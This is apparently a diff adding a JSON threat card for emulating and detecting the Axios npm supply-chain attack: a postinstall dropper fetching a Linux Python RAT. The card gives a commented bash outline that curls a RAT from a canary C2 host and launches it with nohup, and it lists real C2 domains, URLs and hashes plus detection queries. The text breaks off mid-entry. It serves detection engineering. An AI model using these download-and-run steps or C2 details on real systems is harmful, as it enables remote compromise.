@@ -1,0 +1,1019 @@
+{
+  "id": "TTP-2026-0203",
+  "schema_version": "1.0.0",
+  "entry_version": "1.0.0",
+  "status": "active",
+  "metadata": {
+    "created_at": "2026-11-11T00:00:00+00:00",
+    "updated_at": "2026-11-11T00:00:00+00:00",
+    "authors": [
+      {
+        "name": "Henry Reed",
+        "email": "hreed@paloaltonetworks.com",
+        "role": "author"
+      }
+    ],
+    "tags": [
+      "plane-koi",
+      "supply-chain",
+      "npm",
+      "campaign-axios-plain-crypto-js",
+      "vector-postinstall-hook",
+      "malware-python-rat",
+      "platform-linux",
+      "wildfire-test-file",
+      "severity-high"
+    ],
+    "source_refs": [
+      "SRC-UNIT42",
+      "SRC-MITRE-ATTACK",
+      "SRC-PANW-TECHDOCS"
+    ],
+    "pov_engine": {
+      "engine_version_min": "0.1.0",
+      "auto_load": true,
+      "simulation_class": "supply-chain",
+      "destructive": false,
+      "requires_network_egress": true,
+      "requires_internet": true,
+      "platforms": [
+        "linux"
+      ],
+      "estimated_runtime_seconds": 420,
+      "cleanup_required": true,
+      "safety_class": "lab-only"
+    }
+  },
+  "identity": {
+    "name": "Axios npm Supply Chain — plain-crypto-js Postinstall Dropper to a Linux Python RAT (rundir, runscript, peinject, kill)",
+    "summary": "A hijacked Axios maintainer account published axios 1.14.1 and 0.30.4 with plain-crypto-js@4.2.1 injected as a dependency. Its postinstall hook runs an obfuscated setup.js that fetches a Python RAT to /tmp/ld.py, launches it with nohup and then erases its own traces. The RAT beacons by HTTP POST and takes four commands.",
+    "description": "Source: Unit 42, 'Threat Brief: Widespread Impact of the Axios Supply Chain Attack' (published 2026-04-01; Unit 42 stopped updating the brief on 2026-05-19). The axios source code was not modified: the compromised releases add plain-crypto-js@4.2.1 as a runtime dependency, and npm's postinstall lifecycle hook runs its dropper, setup.js, in the background. setup.js hides its strings with string reversal, Base64 and an XOR cipher (key OrDeR_7077), queries the operating system and POSTs a platform-specific body to the C2 on port 8000: packages.npm[.]org/product0 for macOS, product1 for Windows, product2 for Linux. On Linux it downloads a Python RAT to /tmp/ld.py and runs it in the background with nohup, passing the C2 URL as the only argument. It then deletes setup.js and replaces the tampered package.json with a clean decoy named package.md; Unit 42 puts install-to-compromise at roughly 15 seconds. The C++, PowerShell and Python payloads implement one RAT with an identical protocol: Base64-encoded JSON by HTTP POST, a 60-second beacon, one hard-coded Internet Explorer 8 user-agent, and four commands (kill, runscript, peinject, rundir). Unit 42 names no actor of its own; it reports overlap with activity previously reported as involving the DPRK and with the WAVESHAPER backdoor. Affected sectors named by Unit 42, across the U.S., Europe, the Middle East, South Asia and Australia: business services, customer service, financial services, high tech, higher education, insurance, media and entertainment, medical equipment, professional and legal services, and retail. Linked source: the Unit 42 post links an Elastic Security Labs analysis that documents Linux RAT internals Unit 42 does not (message type names, the position-dependent XOR key index, the Script and Param fields, the peinject drop to a hidden six-character file under /tmp). Wherever this card uses one of those details it says 'linked source'; they are Elastic's findings, not Unit 42's. What SIM-KOI-012 does: it executes the Linux second stage for real inside /var/tmp/.cortexsim-axios with a benign stand-in RAT. The npm install and node setup.js hop is staged on disk only, because the lab endpoint has no node. The published C2 is never contacted; executed calls go to a .invalid canary, and the one real download is Palo Alto Networks' official WildFire test ELF, which the RAT's peinject verb drops and runs. What the scenario declares: the agent's Local Analysis Malware verdict on that payload (built-in, observed in this lab for the same file), six XQL validation rows (Tier-2 verify only), and the operator-installed correlation CR-KOI-0012. Everything else on this card is hunt or reference content that the scenario does not declare: the Unit 42 hunting queries, the published IOCs, three operator-installable BIOCs and the network legs. tenant-verified: 0. No run of SIM-KOI-012 has executed against a live Cortex tenant; authored is not proven.",
+    "severity": "high",
+    "confidence": "medium"
+  },
+  "threat_context": {
+    "actors": [],
+    "campaigns": [
+      "Axios npm supply chain attack (axios 1.14.1 and 0.30.4, plain-crypto-js 4.2.1)"
+    ],
+    "malware_families": [],
+    "industries_targeted": [
+      "professional-services",
+      "financial-services",
+      "technology",
+      "education",
+      "media-entertainment",
+      "retail-hospitality"
+    ],
+    "geographies_targeted": [
+      "United States",
+      "Europe",
+      "Middle East",
+      "South Asia",
+      "Australia"
+    ]
+  },
+  "mitre_attack": {
+    "matrix": "enterprise",
+    "techniques": [
+      {
+        "technique_id": "T1195",
+        "subtechnique_id": "T1195.001",
+        "name": "Supply Chain Compromise: Compromise Software Dependencies and Development Tools",
+        "tactic_ids": [
+          "TA0001"
+        ],
+        "tactic_names": [
+          "Initial Access"
+        ]
+      },
+      {
+        "technique_id": "T1204",
+        "subtechnique_id": "T1204.005",
+        "name": "User Execution: Malicious Library",
+        "tactic_ids": [
+          "TA0002"
+        ],
+        "tactic_names": [
+          "Execution"
+        ]
+      },
+      {
+        "technique_id": "T1105",
+        "name": "Ingress Tool Transfer",
+        "tactic_ids": [
+          "TA0011"
+        ],
+        "tactic_names": [
+          "Command and Control"
+        ]
+      },
+      {
+        "technique_id": "T1219",
+        "name": "Remote Access Tools",
+        "tactic_ids": [
+          "TA0011"
+        ],
+        "tactic_names": [
+          "Command and Control"
+        ]
+      },
+      {
+        "technique_id": "T1059",
+        "subtechnique_id": "T1059.006",
+        "name": "Command and Scripting Interpreter: Python",
+        "tactic_ids": [
+          "TA0002"
+        ],
+        "tactic_names": [
+          "Execution"
+        ]
+      },
+      {
+        "technique_id": "T1059",
+        "subtechnique_id": "T1059.004",
+        "name": "Command and Scripting Interpreter: Unix Shell",
+        "tactic_ids": [
+          "TA0002"
+        ],
+        "tactic_names": [
+          "Execution"
+        ]
+      },
+      {
+        "technique_id": "T1059",
+        "subtechnique_id": "T1059.007",
+        "name": "Command and Scripting Interpreter: JavaScript",
+        "tactic_ids": [
+          "TA0002"
+        ],
+        "tactic_names": [
+          "Execution"
+        ]
+      },
+      {
+        "technique_id": "T1027",
+        "name": "Obfuscated Files or Information",
+        "tactic_ids": [
+          "TA0005"
+        ],
+        "tactic_names": [
+          "Defense Evasion"
+        ]
+      },
+      {
+        "technique_id": "T1140",
+        "name": "Deobfuscate/Decode Files or Information",
+        "tactic_ids": [
+          "TA0005"
+        ],
+        "tactic_names": [
+          "Defense Evasion"
+        ]
+      },
+      {
+        "technique_id": "T1036",
+        "name": "Masquerading",
+        "tactic_ids": [
+          "TA0005"
+        ],
+        "tactic_names": [
+          "Defense Evasion"
+        ]
+      },
+      {
+        "technique_id": "T1070",
+        "subtechnique_id": "T1070.004",
+        "name": "Indicator Removal: File Deletion",
+        "tactic_ids": [
+          "TA0005"
+        ],
+        "tactic_names": [
+          "Defense Evasion"
+        ]
+      },
+      {
+        "technique_id": "T1564",
+        "subtechnique_id": "T1564.001",
+        "name": "Hide Artifacts: Hidden Files and Directories",
+        "tactic_ids": [
+          "TA0005"
+        ],
+        "tactic_names": [
+          "Defense Evasion"
+        ]
+      },
+      {
+        "technique_id": "T1071",
+        "subtechnique_id": "T1071.001",
+        "name": "Application Layer Protocol: Web Protocols",
+        "tactic_ids": [
+          "TA0011"
+        ],
+        "tactic_names": [
+          "Command and Control"
+        ]
+      },
+      {
+        "technique_id": "T1571",
+        "name": "Non-Standard Port",
+        "tactic_ids": [
+          "TA0011"
+        ],
+        "tactic_names": [
+          "Command and Control"
+        ]
+      },
+      {
+        "technique_id": "T1132",
+        "subtechnique_id": "T1132.001",
+        "name": "Data Encoding: Standard Encoding",
+        "tactic_ids": [
+          "TA0011"
+        ],
+        "tactic_names": [
+          "Command and Control"
+        ]
+      },
+      {
+        "technique_id": "T1082",
+        "name": "System Information Discovery",
+        "tactic_ids": [
+          "TA0007"
+        ],
+        "tactic_names": [
+          "Discovery"
+        ]
+      },
+      {
+        "technique_id": "T1057",
+        "name": "Process Discovery",
+        "tactic_ids": [
+          "TA0007"
+        ],
+        "tactic_names": [
+          "Discovery"
+        ]
+      },
+      {
+        "technique_id": "T1083",
+        "name": "File and Directory Discovery",
+        "tactic_ids": [
+          "TA0007"
+        ],
+        "tactic_names": [
+          "Discovery"
+        ]
+      }
+    ],
+    "kill_chain_phase": "installation",
+    "data_sources": [
+      "Process: Process Creation",
+      "Command: Command Execution",
+      "File: File Creation",
+      "File: File Modification",
+      "File: File Deletion",
+      "Network Traffic: Network Connection Creation",
+      "Network Traffic: Network Traffic Content"
+    ]
+  },
+  "execution": {
+    "target_platform": "linux",
+    "execution_framework": "custom-cortex",
+    "framework_reference_id": "SIM-KOI-012 — Axios supply chain Linux second stage, executed for real inside /var/tmp/.cortexsim-axios by the CortexSim beacon as root (the real chain needs only the developer's own user).",
+    "privilege_required": "user",
+    "prerequisites": [
+      {
+        "description": "Cortex XDR agent on the Linux endpoint with the malware profile in report mode (lab: 9.4.0.470 on Ubuntu 24.04).",
+        "check_command": "test -x /opt/traps/bin/cytool && /opt/traps/bin/cytool runtime query | head -n 5"
+      },
+      {
+        "description": "python3 and curl on the endpoint (stock on Ubuntu 24.04). node and npm are NOT needed and nothing declared depends on them.",
+        "check_command": "command -v python3 && command -v curl"
+      },
+      {
+        "description": "Outbound HTTPS to wildfire.paloaltonetworks.com for the official test ELF (step-06). No other real destination is contacted.",
+        "check_command": "curl -fsSI https://wildfire.paloaltonetworks.com/publicapi/test/elf | head -n 1"
+      },
+      {
+        "description": "Correlation CR-KOI-0012 from this card is installed in the tenant at Medium before the run. Without it the Correlation row cannot fire.",
+        "check_command": "echo 'confirm in the tenant console: Detection Rules > Correlations'"
+      },
+      {
+        "description": "No execution of the WildFire test ELF on this host in the previous hour (Local Analysis issues are deduplicated for one hour per file).",
+        "check_command": "echo 'check the tenant for a Local Analysis Malware issue on this host in the last hour'"
+      }
+    ],
+    "payload": {
+      "interpreter": "bash",
+      "code": "# NOT A SUBSTITUTE FOR THE SCENARIO: scenarios/koi/sim-koi-012-axios-supply-chain-python-rat.yml is the delivery path (seven steps, 40 s apart). This is the shape only; it stages no RAT and reaches no detection.\nR=/var/tmp/.cortexsim-axios\n# 1 stage node_modules/axios and node_modules/plain-crypto-js, decode the dropper string table with python3\n# 2 curl -o \"$R/tmp/ld.py\" -d packages.npm.org/product2 -s --max-time 3 http://axios-c2.cortexsim-canary.invalid:8000/6202033\n# 3 nohup python3 \"$R/tmp/ld.py\" http://axios-c2.cortexsim-canary.invalid:8000/6202033 &\n# 4 rm setup.js; mv package.md package.json\n# 5 task the RAT: rundir, runscript\n# 6 task the RAT: peinject with the WildFire test ELF\n# 7 task the RAT: kill",
+      "input_variables": [],
+      "timeout_seconds": 180
+    },
+    "expected_artifacts": [
+      {
+        "artifact_type": "file",
+        "description": "The poisoned package tree: package.json, package.md and setup.js under node_modules/plain-crypto-js.",
+        "expected_value": "action_file_path contains \"/var/tmp/.cortexsim-axios/proj/node_modules/plain-crypto-js\""
+      },
+      {
+        "artifact_type": "process",
+        "description": "curl with the Linux POST body and the mirrored drop path; the canary host never resolves.",
+        "expected_value": "action_process_image_name = \"curl\" and action_process_image_command_line contains \"packages.npm.org/product2\""
+      },
+      {
+        "artifact_type": "file",
+        "description": "The RAT stand-in written at the mirror of /tmp/ld.py.",
+        "expected_value": "action_file_path = \"/var/tmp/.cortexsim-axios/tmp/ld.py\""
+      },
+      {
+        "artifact_type": "process",
+        "description": "python3 started on ld.py with the C2 canary URL as its argument; long-lived.",
+        "expected_value": "action_process_image_command_line contains \"/var/tmp/.cortexsim-axios/tmp/ld.py\" and action_process_image_command_line contains \":8000/6202033\""
+      },
+      {
+        "artifact_type": "process",
+        "description": "The dropper's manifest swap: mv renames package.md over package.json.",
+        "expected_value": "action_process_image_name = \"mv\" and action_process_image_command_line contains \"plain-crypto-js/package.md\""
+      },
+      {
+        "artifact_type": "process",
+        "description": "runscript: a shell child of the RAT, then id, uname and ls.",
+        "expected_value": "actor_process_command_line contains \"/var/tmp/.cortexsim-axios/tmp/ld.py\" and action_process_image_command_line contains \"uname -a\""
+      },
+      {
+        "artifact_type": "process",
+        "description": "peinject: the WildFire test ELF executed from a hidden six-character dot-file, then the agent's Local Analysis Malware issue.",
+        "expected_value": "action_process_image_path ~= \"^/var/tmp/[.]cortexsim-axios/tmp/[.][A-Za-z0-9]{6}$\""
+      }
+    ],
+    "cleanup": {
+      "interpreter": "bash",
+      "code": "P=/var/tmp/.cortexsim-axios/run/ld.pid\nif [ -f \"$P\" ] && grep -q cortexsim-axios \"/proc/$(cat \"$P\")/cmdline\" 2>/dev/null; then kill \"$(cat \"$P\")\" 2>/dev/null; fi\nrm -rf /var/tmp/.cortexsim-axios"
+    }
+  },
+  "detections": {
+    "iocs": [
+      {
+        "ioc_type": "file-sha256",
+        "value": "ad8ba560ae5c4af4758bc68cc6dcf43bae0e0bbf9da680a8dc60a9ef78e22ff7",
+        "context": "Unit 42 SHA256 list; Unit 42 gives no file label for any hash. Not surfaced by SIM-KOI-012: the lab RAT is a benign stand-in with a different hash.",
+        "reputation_required": "malicious",
+        "source_url": "https://unit42.paloaltonetworks.com/axios-supply-chain-attack/",
+        "published": "2026-04-01",
+        "safe_form": "hash_only"
+      },
+      {
+        "ioc_type": "file-sha256",
+        "value": "fcb81618bb15edfdedfb638b4c08a2af9cac9ecfa551af135a8402bf980375cf",
+        "context": "Unit 42 SHA256 list; Unit 42 gives no file label for any hash. Printed 3 times in the published list. Linked source only (Elastic Security Labs, not a Unit 42 label): names this value ld.py, the Linux payload. Not surfaced by SIM-KOI-012: the lab RAT is a benign stand-in with a different hash.",
+        "reputation_required": "malicious",
+        "source_url": "https://unit42.paloaltonetworks.com/axios-supply-chain-attack/",
+        "published": "2026-04-01",
+        "safe_form": "hash_only"
+      },
+      {
+        "ioc_type": "file-sha256",
+        "value": "cdc05cd30eb53315dadb081a7b942bb876f0d252d20e8ed4d2f36be79ee691fa",
+        "context": "Unit 42 SHA256 list; Unit 42 gives no file label for any hash. Not surfaced by SIM-KOI-012: the lab RAT is a benign stand-in with a different hash.",
+        "reputation_required": "malicious",
+        "source_url": "https://unit42.paloaltonetworks.com/axios-supply-chain-attack/",
+        "published": "2026-04-01",
+        "safe_form": "hash_only"
+      },
+      {
+        "ioc_type": "file-sha256",
+        "value": "8449341ddc3f7fcc2547639e21e704400ca6a8a6841ae74e57c04445b1276a10",
+        "context": "Unit 42 SHA256 list; Unit 42 gives no file label for any hash. Not surfaced by SIM-KOI-012: the lab RAT is a benign stand-in with a different hash.",
+        "reputation_required": "malicious",
+        "source_url": "https://unit42.paloaltonetworks.com/axios-supply-chain-attack/",
+        "published": "2026-04-01",
+        "safe_form": "hash_only"
+      },
+      {
+        "ioc_type": "file-sha256",
+        "value": "01c9484abc948daa525516464785009d1e7a63ffd6012b9e85b56477acc3e624",
+        "context": "Unit 42 SHA256 list; Unit 42 gives no file label for any hash. Not surfaced by SIM-KOI-012: the lab RAT is a benign stand-in with a different hash.",
+        "reputation_required": "malicious",
+        "source_url": "https://unit42.paloaltonetworks.com/axios-supply-chain-attack/",
+        "published": "2026-04-01",
+        "safe_form": "hash_only"
+      },
+      {
+        "ioc_type": "file-sha256",
+        "value": "7b47ed28e84437aee64ffe9770d315c1b984135105f7f608a8b9579517bc0695",
+        "context": "Unit 42 SHA256 list; Unit 42 gives no file label for any hash. Not surfaced by SIM-KOI-012: the lab RAT is a benign stand-in with a different hash.",
+        "reputation_required": "malicious",
+        "source_url": "https://unit42.paloaltonetworks.com/axios-supply-chain-attack/",
+        "published": "2026-04-01",
+        "safe_form": "hash_only"
+      },
+      {
+        "ioc_type": "file-sha256",
+        "value": "526ab39d1f56732e4e926715aaa797feb13b1ae86882ec570a4d292e7fdc3699",
+        "context": "Unit 42 SHA256 list; Unit 42 gives no file label for any hash. Not surfaced by SIM-KOI-012: the lab RAT is a benign stand-in with a different hash.",
+        "reputation_required": "malicious",
+        "source_url": "https://unit42.paloaltonetworks.com/axios-supply-chain-attack/",
+        "published": "2026-04-01",
+        "safe_form": "hash_only"
+      },
+      {
+        "ioc_type": "file-sha256",
+        "value": "a98e04dec3a7fe507eb30c72da808bad60bc14d9d80f9770ec99c438faa85a1a",
+        "context": "Unit 42 SHA256 list; Unit 42 gives no file label for any hash. Not surfaced by SIM-KOI-012: the lab RAT is a benign stand-in with a different hash.",
+        "reputation_required": "malicious",
+        "source_url": "https://unit42.paloaltonetworks.com/axios-supply-chain-attack/",
+        "published": "2026-04-01",
+        "safe_form": "hash_only"
+      },
+      {
+        "ioc_type": "file-sha256",
+        "value": "0d83030ab8bfba675fc1661f0756b6770be7dd80b1b718de3d68a01f2e79a5f4",
+        "context": "Unit 42 SHA256 list; Unit 42 gives no file label for any hash. Not surfaced by SIM-KOI-012: the lab RAT is a benign stand-in with a different hash.",
+        "reputation_required": "malicious",
+        "source_url": "https://unit42.paloaltonetworks.com/axios-supply-chain-attack/",
+        "published": "2026-04-01",
+        "safe_form": "hash_only"
+      },
+      {
+        "ioc_type": "file-sha256",
+        "value": "92ff08773995ebc8d55ec4b8e1a225d0d1e51efa4ef88b8849d0071230c9645a",
+        "context": "Unit 42 SHA256 list; Unit 42 gives no file label for any hash. Printed 2 times in the published list. Linked source only (Elastic Security Labs, not a Unit 42 label): names this value com.apple.act.mond, the macOS payload. Not surfaced by SIM-KOI-012: the lab RAT is a benign stand-in with a different hash.",
+        "reputation_required": "malicious",
+        "source_url": "https://unit42.paloaltonetworks.com/axios-supply-chain-attack/",
+        "published": "2026-04-01",
+        "safe_form": "hash_only"
+      },
+      {
+        "ioc_type": "file-sha256",
+        "value": "58401c195fe0a6204b42f5f90995ece5fab74ce7c69c67a24c61a057325af668",
+        "context": "Unit 42 SHA256 list; Unit 42 gives no file label for any hash. Printed 2 times in the published list. Not surfaced by SIM-KOI-012: the lab RAT is a benign stand-in with a different hash.",
+        "reputation_required": "malicious",
+        "source_url": "https://unit42.paloaltonetworks.com/axios-supply-chain-attack/",
+        "published": "2026-04-01",
+        "safe_form": "hash_only"
+      },
+      {
+        "ioc_type": "file-sha256",
+        "value": "e10b1fa84f1d6481625f741b69892780140d4e0e7769e7491e5f4d894c2e0e09",
+        "context": "Unit 42 SHA256 list; Unit 42 gives no file label for any hash. Linked source only (Elastic Security Labs, not a Unit 42 label): names this value setup.js. Not surfaced by SIM-KOI-012: the lab RAT is a benign stand-in with a different hash.",
+        "reputation_required": "malicious",
+        "source_url": "https://unit42.paloaltonetworks.com/axios-supply-chain-attack/",
+        "published": "2026-04-01",
+        "safe_form": "hash_only"
+      },
+      {
+        "ioc_type": "file-sha256",
+        "value": "f7d335205b8d7b20208fb3ef93ee6dc817905dc3ae0c10a0b164f4e7d07121cd",
+        "context": "Unit 42 SHA256 list; Unit 42 gives no file label for any hash. Not surfaced by SIM-KOI-012: the lab RAT is a benign stand-in with a different hash.",
+        "reputation_required": "malicious",
+        "source_url": "https://unit42.paloaltonetworks.com/axios-supply-chain-attack/",
+        "published": "2026-04-01",
+        "safe_form": "hash_only"
+      },
+      {
+        "ioc_type": "file-sha256",
+        "value": "617b67a8e1210e4fc87c92d1d1da45a2f311c08d26e89b12307cf583c900d101",
+        "context": "Unit 42 SHA256 list; Unit 42 gives no file label for any hash. Linked source only (Elastic Security Labs, not a Unit 42 label): names this value 6202033.ps1, the Windows payload. Not surfaced by SIM-KOI-012: the lab RAT is a benign stand-in with a different hash.",
+        "reputation_required": "malicious",
+        "source_url": "https://unit42.paloaltonetworks.com/axios-supply-chain-attack/",
+        "published": "2026-04-01",
+        "safe_form": "hash_only"
+      },
+      {
+        "ioc_type": "file-sha256",
+        "value": "e49c2732fb9861548208a78e72996b9c3c470b6b562576924bcc3a9fb75bf9ff",
+        "context": "Unit 42 SHA256 list; Unit 42 gives no file label for any hash. Linked source only (Elastic Security Labs, not a Unit 42 label): names this value system.bat. Not surfaced by SIM-KOI-012: the lab RAT is a benign stand-in with a different hash.",
+        "reputation_required": "malicious",
+        "source_url": "https://unit42.paloaltonetworks.com/axios-supply-chain-attack/",
+        "published": "2026-04-01",
+        "safe_form": "hash_only"
+      },
+      {
+        "ioc_type": "file-sha256",
+        "value": "506690fcbd10fbe6f2b85b49a1fffa9d984c376c25ef6b73f764f670e932cab4",
+        "context": "Unit 42 SHA256 list; Unit 42 gives no file label for any hash. Printed 2 times in the published list. Not surfaced by SIM-KOI-012: the lab RAT is a benign stand-in with a different hash.",
+        "reputation_required": "malicious",
+        "source_url": "https://unit42.paloaltonetworks.com/axios-supply-chain-attack/",
+        "published": "2026-04-01",
+        "safe_form": "hash_only"
+      },
+      {
+        "ioc_type": "file-sha256",
+        "value": "4465bdeaddc8c049a67a3d5ec105b2f07dae72fa080166e51b8f487516eb8d07",
+        "context": "Unit 42 SHA256 list; Unit 42 gives no file label for any hash. Printed 2 times in the published list. Not surfaced by SIM-KOI-012: the lab RAT is a benign stand-in with a different hash.",
+        "reputation_required": "malicious",
+        "source_url": "https://unit42.paloaltonetworks.com/axios-supply-chain-attack/",
+        "published": "2026-04-01",
+        "safe_form": "hash_only"
+      },
+      {
+        "ioc_type": "file-sha256",
+        "value": "5bb67e88846096f1f8d42a0f0350c9c46260591567612ff9af46f98d1b7571cd",
+        "context": "Unit 42 SHA256 list; Unit 42 gives no file label for any hash. Not surfaced by SIM-KOI-012: the lab RAT is a benign stand-in with a different hash.",
+        "reputation_required": "malicious",
+        "source_url": "https://unit42.paloaltonetworks.com/axios-supply-chain-attack/",
+        "published": "2026-04-01",
+        "safe_form": "hash_only"
+      },
+      {
+        "ioc_type": "file-sha256",
+        "value": "59336a964f110c25c112bcc5adca7090296b54ab33fa95c0744b94f8a0d80c0f",
+        "context": "Unit 42 SHA256 list; Unit 42 gives no file label for any hash. Not surfaced by SIM-KOI-012: the lab RAT is a benign stand-in with a different hash.",
+        "reputation_required": "malicious",
+        "source_url": "https://unit42.paloaltonetworks.com/axios-supply-chain-attack/",
+        "published": "2026-04-01",
+        "safe_form": "hash_only"
+      },
+      {
+        "ioc_type": "file-sha256",
+        "value": "a224dd73b7ed33e0bf6a2ea340c8f8859dfa9ec5736afa8baea6225bf066b248",
+        "context": "Unit 42 SHA256 list; Unit 42 gives no file label for any hash. Not surfaced by SIM-KOI-012: the lab RAT is a benign stand-in with a different hash.",
+        "reputation_required": "malicious",
+        "source_url": "https://unit42.paloaltonetworks.com/axios-supply-chain-attack/",
+        "published": "2026-04-01",
+        "safe_form": "hash_only"
+      },
+      {
+        "ioc_type": "file-sha256",
+        "value": "5e2ab672c3f98f21925bd26d9a9bba036b67d84fde0dfdbe2cf9b85b170cab71",
+        "context": "Unit 42 SHA256 list; Unit 42 gives no file label for any hash. Not surfaced by SIM-KOI-012: the lab RAT is a benign stand-in with a different hash.",
+        "reputation_required": "malicious",
+        "source_url": "https://unit42.paloaltonetworks.com/axios-supply-chain-attack/",
+        "published": "2026-04-01",
+        "safe_form": "hash_only"
+      },
+      {
+        "ioc_type": "file-sha256",
+        "value": "20df0909a3a0ef26d74ae139763a380e49f77207aa1108d4640d8b6f14cab8ca",
+        "context": "Unit 42 SHA256 list; Unit 42 gives no file label for any hash. Not surfaced by SIM-KOI-012: the lab RAT is a benign stand-in with a different hash.",
+        "reputation_required": "malicious",
+        "source_url": "https://unit42.paloaltonetworks.com/axios-supply-chain-attack/",
+        "published": "2026-04-01",
+        "safe_form": "hash_only"
+      },
+      {
+        "ioc_type": "file-sha256",
+        "value": "5b5fbc627502c5797d97b206b6dcf537889e6bea6d4e81a835e103e311690e22",
+        "context": "Unit 42 SHA256 list; Unit 42 gives no file label for any hash. Not surfaced by SIM-KOI-012: the lab RAT is a benign stand-in with a different hash.",
+        "reputation_required": "malicious",
+        "source_url": "https://unit42.paloaltonetworks.com/axios-supply-chain-attack/",
+        "published": "2026-04-01",
+        "safe_form": "hash_only"
+      },
+      {
+        "ioc_type": "file-sha256",
+        "value": "9c64f1c7eba080b4e5ff17369ddcd00b9fe2d47dacdc61444b4cbfebb23a166c",
+        "context": "Unit 42 SHA256 list; Unit 42 gives no file label for any hash. Not surfaced by SIM-KOI-012: the lab RAT is a benign stand-in with a different hash.",
+        "reputation_required": "malicious",
+        "source_url": "https://unit42.paloaltonetworks.com/axios-supply-chain-attack/",
+        "published": "2026-04-01",
+        "safe_form": "hash_only"
+      },
+      {
+        "ioc_type": "ipv4",
+        "value": "142.11.206.73",
+        "context": "Unit 42 IP Addresses and Domains list (defanged in prose: 142.11.206[.]73); the recommendations call it the attacker's C2 IP address. Never contacted by SIM-KOI-012.",
+        "reputation_required": "malicious",
+        "source_url": "https://unit42.paloaltonetworks.com/axios-supply-chain-attack/",
+        "published": "2026-04-01",
+        "safe_form": "log_field"
+      },
+      {
+        "ioc_type": "domain",
+        "value": "sfrclak.com",
+        "context": "Unit 42 IP Addresses and Domains list (defanged in prose: sfrclak[.]com); the body text calls it the C2 domain. The dropper POSTs to it on port 8000. SIM-KOI-012 substitutes a non-resolving .invalid canary.",
+        "reputation_required": "malicious",
+        "source_url": "https://unit42.paloaltonetworks.com/axios-supply-chain-attack/",
+        "published": "2026-04-01",
+        "safe_form": "log_field"
+      },
+      {
+        "ioc_type": "domain",
+        "value": "callnrwise.com",
+        "context": "Unit 42 IP Addresses and Domains list (defanged in prose: callnrwise[.]com). The post does not state its role, and none is assigned here.",
+        "reputation_required": "malicious",
+        "source_url": "https://unit42.paloaltonetworks.com/axios-supply-chain-attack/",
+        "published": "2026-04-01",
+        "safe_form": "log_field"
+      },
+      {
+        "ioc_type": "url",
+        "value": "http://sfrclak.com:8000",
+        "context": "Unit 42 IP Addresses and Domains list (as published: hxxp://sfrclak[.]com:8000). The C2 server the dropper POSTs to.",
+        "reputation_required": "malicious",
+        "source_url": "https://unit42.paloaltonetworks.com/axios-supply-chain-attack/",
+        "published": "2026-04-01",
+        "safe_form": "log_field"
+      },
+      {
+        "ioc_type": "url",
+        "value": "http://sfrclak.com:8000/6202033",
+        "context": "Unit 42 IP Addresses and Domains list (as published: hxxp://sfrclak[.]com:8000/6202033). Figure 1 shows it passed as the argument on every platform's launch line. SIM-KOI-012 keeps the port and path and swaps the host for a .invalid canary.",
+        "reputation_required": "malicious",
+        "source_url": "https://unit42.paloaltonetworks.com/axios-supply-chain-attack/",
+        "published": "2026-04-01",
+        "safe_form": "log_field"
+      },
+      {
+        "ioc_type": "filepath",
+        "value": "/tmp/ld.py",
+        "context": "Linux Python RAT script path (delivery section, Figure 1 and the File Indicators query). SIM-KOI-012 mirrors it inside its sandbox as /var/tmp/.cortexsim-axios/tmp/ld.py.",
+        "reputation_required": "malicious",
+        "source_url": "https://unit42.paloaltonetworks.com/axios-supply-chain-attack/",
+        "published": "2026-04-01"
+      },
+      {
+        "ioc_type": "filepath",
+        "value": "/Library/Caches/com.apple.act.mond",
+        "context": "macOS Mach-O RAT path (text and Figure 1). Out of lab scope.",
+        "reputation_required": "malicious",
+        "source_url": "https://unit42.paloaltonetworks.com/axios-supply-chain-attack/",
+        "published": "2026-04-01"
+      },
+      {
+        "ioc_type": "filepath",
+        "value": "%PROGRAMDATA%\\wt.exe",
+        "context": "Windows: a copy of the legitimate PowerShell binary that runs the PowerShell RAT script. Out of lab scope.",
+        "reputation_required": "suspicious",
+        "source_url": "https://unit42.paloaltonetworks.com/axios-supply-chain-attack/",
+        "published": "2026-04-01"
+      },
+      {
+        "ioc_type": "filepath",
+        "value": "C:\\\\Users\\\\$USER$\\\\AppData\\\\Local\\\\Temp\\\\6202033.ps1",
+        "context": "Windows PowerShell RAT script path, with the doubled backslashes exactly as Figure 1 prints them. Out of lab scope.",
+        "reputation_required": "malicious",
+        "source_url": "https://unit42.paloaltonetworks.com/axios-supply-chain-attack/",
+        "published": "2026-04-01"
+      },
+      {
+        "ioc_type": "filename",
+        "value": "setup.js",
+        "context": "The obfuscated Node.js postinstall dropper inside plain-crypto-js. A common file name: meaningful only inside a node_modules/plain-crypto-js directory.",
+        "reputation_required": "suspicious",
+        "source_url": "https://unit42.paloaltonetworks.com/axios-supply-chain-attack/",
+        "published": "2026-04-01"
+      },
+      {
+        "ioc_type": "filename",
+        "value": "package.md",
+        "context": "The clean decoy manifest that replaces the tampered package.json after the payload launches. Meaningful only inside a node_modules package directory.",
+        "reputation_required": "suspicious",
+        "source_url": "https://unit42.paloaltonetworks.com/axios-supply-chain-attack/",
+        "published": "2026-04-01"
+      },
+      {
+        "ioc_type": "user-agent",
+        "value": "mozilla/4.0 (compatible; msie 8.0; windows nt 5.1; trident/4.0",
+        "context": "Hard-coded user-agent of every RAT variant (Internet Explorer 8 on Windows XP), exactly as Unit 42 prints it, without a closing parenthesis. The linked Elastic analysis prints the same string closed. Needs HTTP header visibility on a proxy or firewall.",
+        "reputation_required": "malicious",
+        "source_url": "https://unit42.paloaltonetworks.com/axios-supply-chain-attack/",
+        "published": "2026-04-01",
+        "safe_form": "log_field"
+      }
+    ],
+    "biocs": [
+      {
+        "name": "KOI-012 Interpreter Started On Tmp Script With HTTP URL Argument",
+        "description": "A script interpreter starts with a script under /tmp (or /var/tmp) as its first argument and an http or https URL as the next. This is the shape of Figure 1's Linux launch line, python3 /tmp/ld.py followed by the C2 URL, and of the mirrored launch in SIM-KOI-012 step-03. Operator-installed and NOT declared by SIM-KOI-012 (the lab tenant lists 0 custom BIOC rules, so the scenario expects nothing from it). To use it, create a BIOC rule in the tenant from the XQL below at severity Medium; CortexSim never writes it. Untested in any tenant.",
+        "logic": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter agent_os_type = ENUM.AGENT_OS_LINUX\n| filter action_process_image_command_line ~= \"(python[0-9.]*|perl|ruby|node) +(/var)?/tmp/[^ ]+ +https?://\"",
+        "severity": "medium",
+        "mitre_technique_ids": [
+          "T1059.006",
+          "T1219"
+        ]
+      },
+      {
+        "name": "KOI-012 Interpreter Runs Hidden Dot File From Tmp",
